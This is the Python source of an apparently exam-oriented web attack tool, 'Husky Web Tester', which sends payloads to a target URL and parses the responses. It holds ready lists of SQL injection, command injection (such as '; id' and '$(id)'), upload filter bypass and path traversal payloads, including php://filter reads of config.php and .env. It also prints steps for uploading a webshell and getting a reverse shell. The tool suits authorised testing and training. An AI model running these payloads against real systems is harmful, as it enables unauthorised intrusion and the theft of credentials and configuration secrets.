#!/usr/bin/env python3
"""
Husky Web Tester — web attack payload testing toolkit.

Tests for SQLi, command injection, file upload filter bypasses, and
LFI — using payload libraries and response analysis. OSCP exam safe:
identifies what works, you exploit it manually.

Aligns with The Husky Hacker methodology:
  whatweb → dirsearch → identify input points → test payloads → exploit

Requires: requests (pip install requests)
"""

import argparse
import base64
import os
import random
import re
import string
import sys
import textwrap
import time
from urllib.parse import urljoin, urlparse, quote

import requests
import requests.exceptions

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ───────────────── ANSI helpers ───────────────────────────

def _has_color():
    return hasattr(sys.stdout, "isatty") and sys.stdout.isatty()

_C = _has_color()

def _a(code, t): return f"\033[{code}m{t}\033[0m" if _C else t
def red(t):     return _a("91", t)
def green(t):   return _a("92", t)
def yellow(t):  return _a("93", t)
def cyan(t):    return _a("96", t)
def magenta(t): return _a("95", t)
def bold(t):    return _a("1", t)
def dim(t):     return _a("2", t)

BANNER = f"""
{cyan('    __  ____  _______ __ ____  __')}
{cyan('   / / / / / / / ___// //_/')}\\{cyan(' \\ \\/ /')}
{cyan('  / /_/ / / / /\\__ \\/ ,<')}   {cyan(' \\  /')}
{cyan(' / __  / /_/ /___/ / /| |')}  {cyan(' / /')}
{cyan('/_/ /_/\\____//____/_/ |_|')} {cyan('/_/')}
{red('    __  _____   ________ __ __________')}
{red('   / / / /   | / ____/ //_// ____/ __ \\\\')}
{red('  / /_/ / /| |/ /   / ,<  / __/ / /_/ /')}
{red(' / __  / ___ / /___/ /| |/ /___/ _, _/')}
{red('/_/ /_/_/  |_\\____/_/ |_/_____/_/ |_|')}

    {bold('W E B   T E S T E R')}
    {dim('Test the payload. Pull the trigger yourself.')}
"""

TIMEOUT = 10
UA = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
FINDINGS = []

def log(icon, msg, color_fn=None):
    if color_fn:
        print(f"  {color_fn(icon)} {msg}")
    else:
        print(f"  {icon} {msg}")

def finding(category, detail, payload="", evidence=""):
    FINDINGS.append({"category": category, "detail": detail,
                     "payload": payload, "evidence": evidence})
    log("[!!!]", f"{bold(category)}: {detail}", green)
    if payload:
        log("", f"    {cyan('Payload:')} {payload}")
    if evidence:
        log("", f"    {dim('Evidence:')} {evidence[:120]}")

def build_session(cookie=None, headers=None):
    s = requests.Session()
    s.headers["User-Agent"] = UA
    s.verify = False
    if cookie:
        for c in cookie.split(";"):
            c = c.strip()
            if "=" in c:
                k, v = c.split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    if headers:
        for h in headers:
            if ":" in h:
                k, v = h.split(":", 1)
                s.headers[k.strip()] = v.strip()
    return s


# ═══════════════════════════════════════════════════════════
#              SQLi DETECTION (Error-Based)
# ═══════════════════════════════════════════════════════════

SQLI_PAYLOADS = [
    # Basic tests
    ("'", "Single quote"),
    ('"', "Double quote"),
    ("' OR '1'='1", "OR tautology (single)"),
    ('" OR "1"="1', "OR tautology (double)"),
    ("' OR 1=1--", "OR with comment"),
    ("' OR 1=1#", "OR with hash comment"),
    ("1' ORDER BY 1--", "ORDER BY enumeration"),
    ("1' ORDER BY 100--", "ORDER BY high (error expected)"),
    ("' UNION SELECT NULL--", "UNION 1 column"),
    ("' UNION SELECT NULL,NULL--", "UNION 2 columns"),
    ("' UNION SELECT NULL,NULL,NULL--", "UNION 3 columns"),
    ("' UNION SELECT NULL,NULL,NULL,NULL--", "UNION 4 columns"),
    ("' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "UNION 5 columns"),
    # Blind (time-based indicator)
    ("' AND SLEEP(3)--", "Time-based blind (MySQL SLEEP 3s)"),
    ("'; WAITFOR DELAY '0:0:3'--", "Time-based blind (MSSQL WAITFOR 3s)"),
    ("' AND 1=1--", "Boolean blind (true)"),
    ("' AND 1=2--", "Boolean blind (false)"),
    # Error-triggering
    ("' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--", "MySQL EXTRACTVALUE error"),
    ("' AND 1=CONVERT(int,(SELECT @@version))--", "MSSQL CONVERT error"),
    ("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "MySQL error-based double query"),
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch", "mysql_num_rows", "mysql_query",
    "warning: mysql", "warning: pg_",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "syntax error at or near",
    "microsoft ole db provider for sql server",
    "microsoft sql server",
    "ora-00933", "ora-01756", "ora-01747",
    "pg_query", "pg_exec",
    "sqlstate[",
    "sqlite3::", "sqlite_error",
    "unterminated string", "invalid query",
    "sql syntax", "odbc sql server driver",
    "supplied argument is not a valid mysql",
    "call to a member function",
]


def test_sqli(args):
    """Test a parameter for SQL injection indicators."""
    url = args.url
    param = args.param
    method = args.method.upper()
    session = build_session(args.cookie, args.header)

    print(f"\n  {bold(cyan('═══ SQLi Testing ═══'))}")
    print(f"  {dim(f'Target: {url}  |  Param: {param}  |  Method: {method}')}\n")

    # Get baseline response
    log("[*]", "Getting baseline response...", cyan)
    baseline_data = {param: "test123"} if method == "POST" else None
    baseline_params = {param: "test123"} if method == "GET" else None
    try:
        baseline = session.request(method, url, params=baseline_params,
                                  data=baseline_data, timeout=TIMEOUT)
        baseline_len = len(baseline.text)
        baseline_time = baseline.elapsed.total_seconds()
    except Exception as e:
        log("[!]", f"Could not connect: {e}", red)
        return

    log("[+]", f"Baseline: {baseline.status_code} | {baseline_len} bytes | {baseline_time:.2f}s", green)

    # Test payloads
    for payload, desc in SQLI_PAYLOADS:
        data = {param: payload} if method == "POST" else None
        params = {param: payload} if method == "GET" else None

        try:
            start = time.time()
            resp = session.request(method, url, params=params,
                                  data=data, timeout=max(TIMEOUT, 10))
            elapsed = time.time() - start
        except requests.exceptions.Timeout:
            finding("SQLi", f"TIMEOUT on time-based payload — likely vulnerable!",
                    payload=payload, evidence=f"Request timed out (>{TIMEOUT}s)")
            continue
        except Exception:
            continue

        body_lower = resp.text.lower()

        # Check for SQL error messages
        for sig in SQL_ERROR_SIGNATURES:
            if sig in body_lower:
                finding("SQLi", f"SQL error triggered — {desc}",
                        payload=payload, evidence=sig)
                break

        # Check for time-based blind
        if "SLEEP" in payload or "WAITFOR" in payload:
            if elapsed > baseline_time + 2.5:
                finding("SQLi", f"Time-based blind confirmed — {desc}",
                        payload=payload, evidence=f"Response took {elapsed:.1f}s vs baseline {baseline_time:.1f}s")

        # Check for boolean blind (significant response difference)
        len_diff = abs(len(resp.text) - baseline_len)
        if len_diff > 50 and ("1=1" in payload or "1=2" in payload):
            log("[*]", f"Response size changed by {len_diff} bytes with: {dim(desc)}", yellow)

        # Check for UNION success (different response structure)
        if "UNION" in payload and resp.status_code == 200:
            if len(resp.text) != baseline_len and "error" not in body_lower:
                log("[*]", f"UNION response differs ({len(resp.text)} vs {baseline_len} bytes): {dim(desc)}", yellow)

    print()


# ═══════════════════════════════════════════════════════════
#           COMMAND INJECTION DETECTION
# ═══════════════════════════════════════════════════════════

CMDI_PAYLOADS = [
    # Basic separators
    ("; id", "Semicolon separator"),
    ("| id", "Pipe"),
    ("|| id", "Double pipe (OR)"),
    ("& id", "Background ampersand"),
    ("&& id", "Double ampersand (AND)"),
    ("`id`", "Backtick substitution"),
    ("$(id)", "Dollar-paren substitution"),
    # Newline injection
    ("%0aid", "Newline (%0a) injection"),
    ("%0did", "Carriage return (%0d) injection"),
    # Space bypass
    (";${IFS}id", "IFS space bypass"),
    (";{id,}", "Brace expansion"),
    # Time-based
    ("; sleep 3", "Sleep 3s (Linux)"),
    ("| sleep 3", "Sleep 3s via pipe"),
    ("& timeout /t 3", "Timeout 3s (Windows)"),
    ("| ping -c 3 127.0.0.1", "Ping 3s (Linux)"),
    # Output markers
    ("; echo HUSKYTEST123", "Echo marker (Linux)"),
    ("| echo HUSKYTEST123", "Echo marker via pipe"),
    ("& echo HUSKYTEST123", "Echo marker background"),
    ("$(echo HUSKYTEST123)", "Echo via substitution"),
]

CMDI_SUCCESS_MARKERS = [
    "uid=", "gid=", "groups=",  # id output
    "HUSKYTEST123",  # our marker
    "root:", "www-data",  # /etc/passwd leak
]


def test_cmdi(args):
    """Test a parameter for command injection."""
    url = args.url
    param = args.param
    method = args.method.upper()
    session = build_session(args.cookie, args.header)

    print(f"\n  {bold(magenta('═══ Command Injection Testing ═══'))}")
    print(f"  {dim(f'Target: {url}  |  Param: {param}  |  Method: {method}')}\n")

    # Baseline
    log("[*]", "Getting baseline response...", cyan)
    baseline_val = "normalvalue"
    try:
        if method == "POST":
            baseline = session.post(url, data={param: baseline_val}, timeout=TIMEOUT)
        else:
            baseline = session.get(url, params={param: baseline_val}, timeout=TIMEOUT)
        baseline_time = baseline.elapsed.total_seconds()
        baseline_len = len(baseline.text)
    except Exception as e:
        log("[!]", f"Could not connect: {e}", red)
        return

    log("[+]", f"Baseline: {baseline.status_code} | {baseline_len} bytes | {baseline_time:.2f}s", green)

    for payload, desc in CMDI_PAYLOADS:
        test_val = f"{baseline_val}{payload}"

        try:
            start = time.time()
            if method == "POST":
                resp = session.post(url, data={param: test_val}, timeout=max(TIMEOUT, 10))
            else:
                resp = session.get(url, params={param: test_val}, timeout=max(TIMEOUT, 10))
            elapsed = time.time() - start
        except requests.exceptions.Timeout:
            if "sleep" in payload.lower() or "ping" in payload.lower() or "timeout" in payload.lower():
                finding("Command Injection", f"TIMEOUT on time-based payload — {desc}",
                        payload=test_val, evidence=f"Request timed out")
            continue
        except Exception:
            continue

        # Check for command output markers
        for marker in CMDI_SUCCESS_MARKERS:
            if marker in resp.text and marker not in baseline.text:
                finding("Command Injection", f"Command output detected — {desc}",
                        payload=test_val, evidence=marker)
                break

        # Time-based detection
        if "sleep" in payload.lower() or "ping" in payload.lower() or "timeout" in payload.lower():
            if elapsed > baseline_time + 2.5:
                finding("Command Injection", f"Time-based confirmed — {desc}",
                        payload=test_val, evidence=f"{elapsed:.1f}s vs baseline {baseline_time:.1f}s")

    print()


# ═══════════════════════════════════════════════════════════
#            FILE UPLOAD FILTER TESTING
# ═══════════════════════════════════════════════════════════

UPLOAD_EXTENSIONS = [
    (".php", "PHP"), (".phtml", "PHP alt"), (".php5", "PHP5"),
    (".php7", "PHP7"), (".pht", "PHT"), (".phar", "PHAR"),
    (".pHp", "PHP case"), (".pHtml", "PHTML case"),
    (".php.jpg", "Double ext jpg"), (".php.png", "Double ext png"),
    (".php%00.jpg", "Null byte"), (".php%0a.jpg", "Newline"),
    (".php.", "Trailing dot"), (".php ", "Trailing space"),
    (".php::$DATA", "NTFS ADS"),
    (".jsp", "JSP"), (".jspx", "JSPX"),
    (".asp", "ASP"), (".aspx", "ASPX"),
    (".shtml", "SHTML"), (".svg", "SVG"),
]

UPLOAD_MIMES = [
    "image/jpeg", "image/png", "image/gif",
    "application/octet-stream", "text/plain",
    "application/x-httpd-php",
]

UPLOAD_MAGIC = {
    "gif": b"GIF89a\n",
    "png": b"\x89PNG\r\n\x1a\n",
    "jpg": b"\xff\xd8\xff\xe0",
}


def test_upload(args):
    """Test what file extensions and MIME types are accepted."""
    url = args.url
    field = args.field or "file"
    session = build_session(args.cookie, args.header)

    print(f"\n  {bold(yellow('═══ Upload Filter Testing ═══'))}")
    print(f"  {dim(f'Target: {url}  |  Field: {field}')}")
    print(f"  {dim('Testing what gets accepted — no webshells uploaded')}\n")

    # Benign test content — NOT a webshell, just text to test filters
    test_content = b"HUSKY_UPLOAD_TEST_FILE\nThis is a benign test file.\n"
    token = "".join(random.choices(string.ascii_lowercase, k=6))

    accepted = []
    rejected = []

    total = len(UPLOAD_EXTENSIONS) * len(UPLOAD_MIMES)
    tested = 0

    for ext, ext_desc in UPLOAD_EXTENSIONS:
        for mime in UPLOAD_MIMES:
            tested += 1
            filename = f"test_{token}{ext}"

            # Try with and without magic bytes
            for magic_name, magic_bytes in [("none", b""), *UPLOAD_MAGIC.items()]:
                content = magic_bytes + test_content

                files = {field: (filename, content, mime)}
                try:
                    resp = session.post(url, files=files, timeout=TIMEOUT)
                except Exception:
                    continue

                body_lower = resp.text.lower()
                reject_patterns = [
                    "not allowed", "invalid file", "invalid type",
                    "forbidden", "rejected", "error", "extension not",
                    "file type not", "not permitted", "disallowed",
                ]

                is_rejected = any(p in body_lower for p in reject_patterns)

                if resp.status_code in (200, 201, 302) and not is_rejected:
                    result = {
                        "ext": ext, "ext_desc": ext_desc,
                        "mime": mime, "magic": magic_name,
                        "status": resp.status_code,
                    }
                    accepted.append(result)
                    log("[+]", f"{green('ACCEPTED')} {ext:<20} MIME={dim(mime):<25} magic={dim(magic_name)}", green)
                    break  # Found a working combo for this ext, move on
                else:
                    rejected.append(ext)

            if tested % 20 == 0:
                print(f"\r  {dim(f'  [{tested}/{total} tested]')}", end="", flush=True)

    print(f"\r{' ' * 60}\r", end="")

    # Summary
    print(f"\n  {bold('─── Upload Results ───')}")
    print(f"  Tested:   {tested} combinations")
    print(f"  Accepted: {green(str(len(accepted)))}")

    if accepted:
        print(f"\n  {bold('Accepted extensions:')}")
        seen_ext = set()
        for r in accepted:
            if r["ext"] not in seen_ext:
                seen_ext.add(r["ext"])
                finding("Upload", f"Extension {r['ext']} ({r['ext_desc']}) accepted",
                        payload=f"MIME={r['mime']}, magic={r['magic']}")

        print(f"\n  {bold(yellow('Next steps (manual):'))}")
        print(f"    1. Upload an actual PHP/JSP/ASPX webshell with a working extension")
        print(f"    2. Find where it lands (check upload dir, response, or guess common paths)")
        print(f"    3. Access it and confirm execution")
        print(f"    4. Use it to trigger a reverse shell")
        print(f"    {dim('→ Use revshell.py to generate the payload')}")
    else:
        print(f"\n  {dim('No extensions accepted — check field name, auth, or try multipart encoding')}")

    print()


# ═══════════════════════════════════════════════════════════
#              LFI TESTING (Path Traversal)
# ═══════════════════════════════════════════════════════════

LFI_PAYLOADS = [
    # Basic traversals
    ("../../../../../../../etc/passwd", "Basic traversal"),
    ("....//....//....//....//etc/passwd", "Double-dot bypass"),
    ("..%2f..%2f..%2f..%2fetc/passwd", "URL-encoded traversal"),
    ("..%252f..%252f..%252fetc/passwd", "Double URL-encoded"),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "Full URL-encoded dots"),
    ("..%c0%af..%c0%afetc/passwd", "Overlong UTF-8"),
    ("....\\....\\....\\....\\windows\\win.ini", "Windows backslash"),
    ("..%5c..%5c..%5c..%5cwindows\\win.ini", "URL-encoded backslash"),
    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", "PHP filter base64"),
    ("php://filter/convert.base64-encode/resource=config.php", "PHP filter config"),
    ("php://filter/convert.base64-encode/resource=../config.php", "PHP filter parent config"),
    ("php://filter/convert.base64-encode/resource=db.php", "PHP filter db.php"),
    ("php://filter/convert.base64-encode/resource=../db.php", "PHP filter parent db.php"),
    ("php://filter/convert.base64-encode/resource=.env", "PHP filter .env"),
    ("php://filter/string.rot13/resource=index.php", "PHP filter ROT13"),
    # Data wrapper (RCE test - benign echo only)
    (f"data://text/plain;base64,{base64.b64encode(b'HUSKYTEST').decode()}", "data:// wrapper"),
    # Null byte (legacy PHP < 5.3)
    ("../../../etc/passwd%00", "Null byte terminator"),
    ("../../../etc/passwd%00.jpg", "Null byte with extension"),
]

LFI_SUCCESS_MARKERS = [
    "root:", "daemon:", "www-data:",  # /etc/passwd
    "[fonts]", "[extensions]",  # win.ini
    "HUSKYTEST",  # our data:// marker
]


def test_lfi(args):
    """Test a parameter for LFI/path traversal."""
    url = args.url
    param = args.param
    session = build_session(args.cookie, args.header)

    print(f"\n  {bold(red('═══ LFI / Path Traversal Testing ═══'))}")
    print(f"  {dim(f'Target: {url}  |  Param: {param}')}\n")

    # Baseline
    log("[*]", "Getting baseline...", cyan)
    try:
        baseline = session.get(url, params={param: "index"}, timeout=TIMEOUT)
        baseline_len = len(baseline.text)
    except Exception as e:
        log("[!]", f"Could not connect: {e}", red)
        return

    for payload, desc in LFI_PAYLOADS:
        try:
            resp = session.get(url, params={param: payload}, timeout=TIMEOUT)
        except Exception:
            continue

        body = resp.text

        # Direct content markers
        for marker in LFI_SUCCESS_MARKERS:
            if marker in body:
                finding("LFI", f"File read confirmed — {desc}",
                        payload=f"{param}={payload}", evidence=marker)
                break

        # Base64 detection (PHP filter)
        if "php://filter" in payload and resp.status_code == 200:
            clean = body.strip()
            if len(clean) > 20 and clean != baseline.text.strip():
                try:
                    decoded = base64.b64decode(clean).decode("utf-8", errors="replace")
                    if "<?php" in decoded or "<?=" in decoded or "<?" in decoded:
                        finding("LFI", f"PHP source code leaked via filter — {desc}",
                                payload=f"{param}={payload}",
                                evidence=f"Decoded {len(decoded)} bytes of PHP")
                except Exception:
                    pass

        # Response difference (might indicate file read even without markers)
        if abs(len(body) - baseline_len) > 200 and resp.status_code == 200:
            error_words = ["not found", "no such file", "failed to open",
                          "warning:", "include()", "file_get_contents"]
            has_error = any(e in body.lower() for e in error_words)
            if has_error and "warning:" in body.lower():
                log("[*]", f"Include error exposed — {desc}: {dim('Path/function disclosed')}", yellow)

    # data:// wrapper result
    print()


# ═══════════════════════════════════════════════════════════
#                    PAYLOAD DUMP
# ═══════════════════════════════════════════════════════════

def dump_payloads(args):
    """Dump all payload lists for manual use in Burp/curl."""
    category = args.category

    print(f"\n  {bold(cyan('═══ Payload Dump ═══'))}\n")

    if category in ("sqli", "all"):
        print(f"  {bold('SQLi Payloads:')}")
        for payload, desc in SQLI_PAYLOADS:
            print(f"    {payload}")
        print()

    if category in ("cmdi", "all"):
        print(f"  {bold('Command Injection Payloads:')}")
        for payload, desc in CMDI_PAYLOADS:
            print(f"    {payload}")
        print()

    if category in ("lfi", "all"):
        print(f"  {bold('LFI Payloads:')}")
        for payload, desc in LFI_PAYLOADS:
            print(f"    {payload}")
        print()

    if category in ("upload", "all"):
        print(f"  {bold('Upload Extensions:')}")
        for ext, desc in UPLOAD_EXTENSIONS:
            print(f"    {ext:<25} {dim(desc)}")
        print()

    print(f"  {dim('Copy these into Burp Intruder or a curl loop for manual testing')}\n")


# ═══════════════════════════════════════════════════════════
#                        CLI
# ═══════════════════════════════════════════════════════════

def parse_args():
    p = argparse.ArgumentParser(
        description="Husky Web Tester — SQLi, CMDi, Upload, LFI payload testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python3 webtester.py sqli -u "http://target/login.php" --param user -m POST
              python3 webtester.py cmdi -u "http://target/ping.php" --param ip
              python3 webtester.py upload -u "http://target/upload.php" --field fileUpload
              python3 webtester.py lfi -u "http://target/index.php" --param page
              python3 webtester.py payloads --category all
              python3 webtester.py payloads --category sqli > sqli_payloads.txt
        """),
    )

    sub = p.add_subparsers(dest="mode", help="Test mode")

    # Shared args
    def add_shared(sp, need_param=True):
        sp.add_argument("-u", "--url", required=True, help="Target URL")
        if need_param:
            sp.add_argument("--param", required=True, help="Parameter to test")
        sp.add_argument("-m", "--method", default="GET", choices=["GET", "POST"],
                       help="HTTP method (default: GET)")
        sp.add_argument("--cookie", help="Cookies (e.g. 'PHPSESSID=abc123')")
        sp.add_argument("--header", action="append", help="Extra header")

    # SQLi
    sq = sub.add_parser("sqli", help="SQL injection testing")
    add_shared(sq)

    # Command injection
    cm = sub.add_parser("cmdi", help="Command injection testing")
    add_shared(cm)

    # Upload
    up = sub.add_parser("upload", help="Upload filter bypass testing")
    up.add_argument("-u", "--url", required=True, help="Upload form URL")
    up.add_argument("--field", default="file", help="Upload field name (default: file)")
    up.add_argument("--cookie", help="Cookies")
    up.add_argument("--header", action="append", help="Extra header")

    # LFI
    lf = sub.add_parser("lfi", help="LFI / path traversal testing")
    add_shared(lf)

    # Payload dump
    pd = sub.add_parser("payloads", help="Dump payload lists for manual use")
    pd.add_argument("--category", choices=["sqli", "cmdi", "lfi", "upload", "all"],
                    default="all", help="Payload category to dump")

    return p.parse_args()


def main():
    args = parse_args()
    print(BANNER)

    if not args.mode:
        print(f"  Usage: python3 webtester.py {{sqli,cmdi,upload,lfi,payloads}} [options]")
        print(f"\n  {bold('Quick start:')}")
        print(f"    {cyan('python3 webtester.py sqli')}  {dim('-u http://target/login.php --param user -m POST')}")
        print(f"    {cyan('python3 webtester.py cmdi')}  {dim('-u http://target/ping.php --param ip')}")
        print(f"    {cyan('python3 webtester.py upload')} {dim('-u http://target/upload.php --field myFile')}")
        print(f"    {cyan('python3 webtester.py lfi')}   {dim('-u http://target/page.php --param file')}")
        print(f"    {cyan('python3 webtester.py payloads')} {dim('--category sqli > payloads.txt')}\n")
        sys.exit(0)

    if args.mode == "sqli":
        test_sqli(args)
    elif args.mode == "cmdi":
        test_cmdi(args)
    elif args.mode == "upload":
        test_upload(args)
    elif args.mode == "lfi":
        test_lfi(args)
    elif args.mode == "payloads":
        dump_payloads(args)

    # Final summary
    if FINDINGS:
        print(f"\n  {bold(green('═══ FINDINGS SUMMARY ═══'))}")
        for f in FINDINGS:
            print(f"  {green('[!!!]')} {bold(f['category'])}: {f['detail']}")
            if f["payload"]:
                print(f"    {cyan('→')} {f['payload']}")
    elif args.mode != "payloads":
        print(f"\n  {dim('No findings — try different parameters or payloads')}")

    print()


if __name__ == "__main__":
    main()
